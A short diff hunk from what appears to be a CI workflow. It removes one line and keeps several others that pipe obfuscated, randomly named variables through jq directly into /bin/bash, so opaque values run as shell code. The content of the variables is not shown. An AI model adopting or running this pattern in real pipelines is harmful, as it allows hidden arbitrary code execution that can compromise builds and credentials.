@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$tu2714" | jq -r .eckir78532 | /bin/bash
           printf '%s' "$w2717" | jq -r .tpgx0 | /bin/bash
           printf '%s' "$csrgd22402" | jq -r .o9 | /bin/bash
-          echo $uuuvo94800 | jq -r .cz4418 | /bin/bash
           printf '%s' "$rtnk7357" | jq -r .uywn34 | /bin/bash
           echo $umnx433 | jq -r .j64 | /bin/bash
           printf '%s' "$t97480" | jq -r .mc3193 | /bin/bash
